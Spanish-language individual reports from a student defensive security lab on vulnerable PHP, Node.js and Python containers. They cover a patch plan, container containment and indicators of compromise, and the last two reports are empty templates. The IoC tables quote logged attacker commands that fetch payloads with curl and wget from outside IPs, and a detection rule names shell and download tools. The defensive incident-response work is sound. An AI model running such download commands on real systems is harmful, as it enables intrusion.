# Informe individual — TP PHP2Shell / Node2Shell

**Integrante:** _Ulises Mateo Bucchino_
**Usuario de GitHub:** _ulisesutnfrlp7_
**Rol en el TP:** _cambios-parche_
**Fecha:** 29/10/2026
**Grupo:** 08

---

## 1. Situación y riesgo

Durante el laboratorio defensivo se identificaron tres servicios vulnerables en una red aislada (`labnet`, `internal: true`):

| Servicio | Versión inicial | Hallazgo principal | Riesgo |
|----------|----------------|--------------------|--------|
| Portal PHP | PHP 8.3.35 (cli, NTS) | `session.upload_progress.enabled = 1` habilitado | RCE mediante técnica conocida en PHP < 8.3.36 |
| API Node.js | Node v22.23.3 | brotli 1.1.0 aportado por el runtime | Dependencia desactualizada; posible vector secundario |
| Servicio Python | Python 3.11.18 | brotli 1.0.9 | Dependencia desactualizada |

El activo más crítico es el Portal PHP: la función de progreso de subida de sesiones puede ser abusada para ejecución remota de código (RCE) en versiones anteriores a 8.3.36. Como los contenedores no publican puertos y operan sobre red interna sin salida a Internet, la exposición real es limitada, pero el riesgo de movimiento lateral dentro del laboratorio es real si un atacante logra compromiso inicial.

## 2. Plan priorizado

Se aplicó la siguiente priorización (matriz en `entrega.md`, sección 2):

1. **Portal PHP (Alta):** Mitigación inmediata (`session.upload_progress.enabled = 0` en `laboratorio/php/php.ini`, reinicio de `php-lab`, verificación con `ini_get()` → `0`). Parche de versión a PHP 8.3.36 mediante `./scripts/parchear.sh`.
2. **API Node.js (Media):** Parche a Node v22.23.4 con `./scripts/parchear.sh`. Revisar dependencias con brotli.
3. **Servicio Python (Media):** Actualización a Python 3.11.18 con brotli 1.2.1 mediante `./scripts/parchear.sh`.

**Reversión documentada:** `git checkout -- laboratorio/php/php.ini` y volver a tags anteriores con `PHP_TAG`/`NODE_TAG` en `versions.env`.

## 3. Indicadores de compromiso (IoC)

A partir de `audit.log` y `./scripts/detectar.sh`, se identificaron los siguientes hallazgos de caza:

| Timestamp | Host | Padre → hijo | Comando sospechoso | Estado |
|-----------|------|--------------|-------------------|--------|
| 2026-10-27T09:42:17Z | web01 | apache2 → sh | `sh -c id` | Compromiso |
| 2026-10-27T09:43:03Z | api01 | node → sh | `sh -c curl http://198.51.100.7/x` | Compromiso |
| 2026-10-27T09:44:22Z | web01 | apache2 → wget | `wget http://198.51.100.9/a` | Compromiso |
| 2026-10-27T09:45:10Z | svc01 | python → sh | `sh -c uname -a` | Compromiso |

**Regla de detección propuesta (Node.js):** alerta cuando `ppid_comm = node` y `comm ∈ {sh, bash, curl, wget}`. Falso negativo posible si el atacante usa `child_process.exec` sin spawn de shell visible.

**Limitaciones:** el log no registra usuario de origen del atacante ni IP de origen; solo IPs destino (`198.51.100.7`, `198.51.100.9`).

## 4. Transferencia a una CVE distinta (ej. CVE-2026-115560)

Supongamos una vulnerabilidad hipotética **CVE-2026-115560** en un motor de plantillas de Node.js que permite inyección de comandos mediante cabeceras HTTP maliciosas.

- **Similitud con el TP:** al igual que `session.upload_progress.enabled = 1` en PHP, CVE-2026-115560 expone una funcionalidad legítima (procesamiento de plantillas) que puede ser abusada para ejecución remota.
- **Diferencia:** en el TP la mitigación fue deshabilitar una opción de configuración (`session.upload_progress.enabled = 0`); en CVE-2026-115560 la mitigación sería actualizar el motor de plantillas a una versión parcheada y validar/sanitizar cabeceras de entrada.
- **Lección transferible:** en ambos casos, la mitigación de configuración (deshabilitar función innecesaria) es un control inmediato mientras se espera el parche de versión.

## 5. Lecciones aprendidas

1. **Mitigación antes del parche:** deshabilitar una opción de configuración riesgosa (`session.upload_progress.enabled`) reduce el riesgo inmediatamente, sin esperar la ventana de cambio del viernes.
2. **Contención en profundidad:** `internal: true`, `read_only`, `cap_drop: ALL`, usuarios sin privilegios y límites de memoria/PIDs forman capas independientes que limitan el daño incluso si un servicio es comprometido.
3. **Detección sin contexto completo:** los logs de procesos revelan comportamiento anómalo (padre→hijo), pero carecen de usuario/IP de origen; se necesitan múltiples fuentes de telemetría para investigación forense completa.
4. **Documentación como evidencia:** pegar outputs de comandos (`inventario.sh`, `parchear.sh`, `detectar.sh`, `verificar-contencion.sh`) directamente en los entregables evita reconstrucciones imprecisas al final del TP.
5. **Comunicación con gerencia:** hay que traducir riesgos técnicos a impacto de negocio (disponibilidad, confidencialidad) sin dar detalles que ayuden a un atacante.

## 6. Qué no se pudo probar

- Acceso real desde red externa al laboratorio (no hay salida a Internet ni proxy público en el entorno aislado).
- Explotación activa de las vulnerabilidades (el TP prohíbe exploits/PoCs; solo se trabajó con contenedores de la cátedra).

-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.

# Informe individual — TP PHP2Shell / Node2Shell

**Integrante:** _Valentín Garzaniti_
**Usuario de GitHub:** _Vgarzaniti_
**Rol en el TP:** _contencion-comunicacion_
**Fecha:** 29/10/2026
**Grupo:** 08

---

## 1. Situación y riesgo

En el relevamiento del laboratorio se evaluaron tres servicios desplegados en la red interna `labnet` (`internal: true`, sin puertos publicados al host):

| Servicio | Versión inicial | Hallazgo principal | Riesgo |
|----------|----------------|--------------------|--------|
| Portal PHP (`php-lab`) | PHP 8.3.35 | `session.upload_progress.enabled = 1` activo en versión previa a 8.3.36 | Alto — RCE sin autenticación con explotación real confirmada (CISA KEV) |
| API Node.js (`node-lab`) | Node v22.23.3 | Decoder brotli 1.1.0 embebido en el runtime (endpoint `/decode`) | Medio — Vulnerable a CVE-2026-111497, sin explotación activa confirmada |
| Servicio Python (`py-lab`) | Python 3.11.18 | Paquete `brotli` 1.0.9 desactualizado | Medio — Vulnerable a CVE-2026-111497 en servicio interno |

El riesgo más alto recae sobre el Portal PHP (`php-lab`), ya que combina versiones previas a 8.3.36 con `session.upload_progress.enabled = 1`. Aunque en el escenario actual los contenedores no están publicados a Internet, un compromiso inicial o un cambio en el despliegue (por ejemplo, agregar un proxy inverso) permitiría ejecutar comandos en el contenedor y pivotar dentro de la red interna hacia `node-lab` y `py-lab`.

## 2. Plan priorizado

Se ejecutó un plan en tres pasos, priorizando la reducción inmediata de superficie y la verificación de contención antes del parcheo definitivo:

| Acción | Activo | Plazo | Dueño | Reversión |
|--------|--------|-------|-------|-----------|
| 1. Mitigación en configuración (`session.upload_progress.enabled = 0` en `php.ini` y reinicio) | Portal PHP (`php-lab`) | Inmediato (primeros 15 min) | Cambios / Parche | `git checkout -- laboratorio/php/php.ini` y `docker compose restart php-lab` |
| 2. Verificación de controles de contención (`./scripts/verificar-contencion.sh`) | `php-lab`, `node-lab`, `py-lab` | Inmediato (primeros 30 min) | Contención / Comunicación | Ajustar directiva en `docker-compose.yml` y recrear el servicio |
| 3. Parcheo de versiones a PHP 8.3.36, Node v22.23.4 y brotli 1.2.1 (`./scripts/parchear.sh`) | `php-lab`, `node-lab`, `py-lab` | En el día | Cambios / Parche | Volver a tags anteriores con `PHP_TAG` / `NODE_TAG` en `versions.env` y `docker compose up` |

**Justificación:** si un parche de proveedor demorara hasta una ventana de cambio posterior, la mitigación en `php.ini` junto con los controles de contención (`internal: true`, `read_only: true`, `cap_drop: ALL` y límites de recursos) reducen de inmediato el impacto potencial sin interrumpir el servicio.

## 3. Indicadores de compromiso (IoC)

Del análisis de `laboratorio/logs/audit.log` y `./scripts/detectar.sh` surgen señales claras de ejecución anómala en los tres servicios de aplicación, diferenciadas de actividad administrativa normal:

| Timestamp | Host | Padre → hijo | Comando observado | Evaluación |
|-----------|------|--------------|-------------------|------------|
| 2026-10-27T09:42:17Z | web01 | apache2 → sh | `sh -c id` | Compromiso (worker web lanzando shell) |
| 2026-10-27T09:42:40Z | db01 | sshd → bash | `-bash` | Posible falso positivo (sesión SSH administrativa) |
| 2026-10-27T09:43:03Z | api01 | node → sh | `sh -c curl http://198.51.100.7/x` | Compromiso (intento de descarga externa) |
| 2026-10-27T09:44:22Z | web01 | apache2 → wget | `wget http://198.51.100.9/a` | Compromiso (intento de descarga externa) |
| 2026-10-27T09:45:10Z | svc01 | python → sh | `sh -c uname -a` | Compromiso (reconocimiento local) |

**Qué confirma o descarta el incidente:** que `apache2`, `node` o `python` ejecuten `sh`, `curl` o `wget` confirma ejecución de comandos. En cambio, la verificación de contención (`SIN SALIDA` en los tres contenedores) permite confirmar a gerencia que los intentos de descargar etapas adicionales desde `198.51.100.7` y `198.51.100.9` quedan bloqueados por la red `internal: true`.

**Limitaciones del log:** `audit.log` no informa qué usuario ejecutó el proceso, qué IP originó la petición HTTP ni el resultado de red del comando ejecutado.

## 4. Transferencia a una CVE distinta (ej. CVE-2026-115560)

Frente a una vulnerabilidad nueva como **CVE-2026-115560** (por ejemplo, un defecto adicional en el manejo de sesiones o subida de archivos en PHP o en un componente de decodificación HTTP):

- **Qué evaluar primero:** identificar mediante inventario automatizado qué activos tienen habilitada la directiva o dependencia afectada y si reciben tráfico no confiable.
- **Cómo priorizar y contener:** aun cuando el parche oficial no esté disponible el primer día, se aplica primero el control de configuración (deshabilitar la función no esencial o rechazar cabeceras como `Content-Encoding: br` en el borde) y se verifica que el contenedor mantenga `read_only: true`, `cap_drop: ALL` y red sin salida a Internet.
- **Qué cambia en el plan:** con la contención verificada de antemano, la comunicación al comité de crisis pasa de una parada de emergencia a una ventana de cambio programada con riesgo acotado y prueba de reversión lista.

## 5. Lecciones aprendidas

1. **Contención como red de seguridad real:** cuando un servicio sufre ejecución remota (`curl`/`wget` en `audit.log`), el bloqueo de salida (`internal: true`) y el filesystem en solo lectura (`read_only: true`) cortan la cadena de ataque antes de que descargue herramientas o persista en disco.
2. **Mitigar en minutos, parchear con verificación:** deshabilitar `session.upload_progress.enabled` en `php.ini` neutraliza el vector principal mientras se reconstruyen y validan las imágenes con `./scripts/parchear.sh`.
3. **Reducir superficie innecesaria:** si un servicio interno no necesita recibir cuerpos comprimidos con Brotli, rechazar `Content-Encoding: br` evita exponer el decoder de `node-lab` y `py-lab`.
4. **Separar ruido de hallazgos reales:** distinguir un `sshd → bash` en `db01` de un `apache2 → sh` en `web01` evita falsas alarmas durante la respuesta al incidente.
5. **Comunicación ejecutiva clara:** a gerencia se le informa impacto, estado de contención comprobado (`SIN SALIDA`), ventana de parcheo y plan de vuelta atrás, sin exponer detalles técnicos innecesarios hacia afuera.

## 6. Qué no se pudo probar

- Acceso real desde red externa al laboratorio (no hay salida a Internet ni proxy público en el entorno aislado).
- Explotación activa de las vulnerabilidades (el TP es estrictamente defensivo y se trabajó únicamente sobre los contenedores provistos por la cátedra).

-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.

# Informe individual — TP PHP2Shell / Node2Shell

**Integrante:** -
**Usuario de GitHub:** -
**Rol en el TP:** -
**Fecha:** -
**Grupo:** 08

-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.

# Informe individual — TP PHP2Shell / Node2Shell

**Integrante:** -
**Usuario de GitHub:** -
**Rol en el TP:** -
**Fecha:** -
**Grupo:** 08
